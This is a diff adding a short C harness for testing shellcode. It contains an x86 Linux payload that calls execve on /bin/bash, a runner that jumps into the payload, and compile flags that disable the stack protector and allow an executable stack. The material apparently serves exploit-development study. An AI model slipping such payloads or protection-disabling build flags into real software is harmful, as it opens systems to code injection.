@@ -1,0 +1,20 @@
+/*
+A simple program to test shellcode
+gcc -fno-stack-protector -z execstack tshell.c
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[]= \
+"\xeb\x18\x5b\x31\xc0\x88\x43\x09\x89\x5b\x0a\x89\x43\x0e\xb0\x0b\x8d\x1b\x8d\x4b"
+"\x0a\x8d\x53\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
+"\x41\x44\x45\x41\x44\x42\x45\x45\x46";
+
+main()
+{
+	printf("Shellcode Length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+
